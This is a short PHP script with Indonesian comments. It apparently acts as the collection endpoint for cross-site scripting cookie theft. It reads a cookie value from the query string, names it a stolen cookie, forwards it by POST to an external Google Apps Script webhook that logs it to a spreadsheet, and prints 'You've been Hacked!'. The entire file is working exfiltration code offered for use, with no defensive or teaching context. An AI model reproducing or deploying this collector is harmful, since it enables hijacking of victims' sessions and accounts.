<?php
if (isset($_GET['cookie'])) {
    $stolenCookie = $_GET['cookie'];
    $webhookUrl = 'https://script.google.com/macros/s/AKfycbzQrtVwuR69C7QmuBaVCgzScijvxQdVyWjDqYxKl-ctE84XzGV3idjvnq6Y0wW58cw/exec'; // ganti dengan URL Web App Anda

    // Kirim data ke Google Sheets
    $data = http_build_query(['cookie' => $stolenCookie]);
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => $data,
            'timeout' => 5
        ]
    ];
    $context  = stream_context_create($options);
    @file_get_contents($webhookUrl, false, $context);

    echo "You've been Hacked!";
} else {
    echo "No!";
}
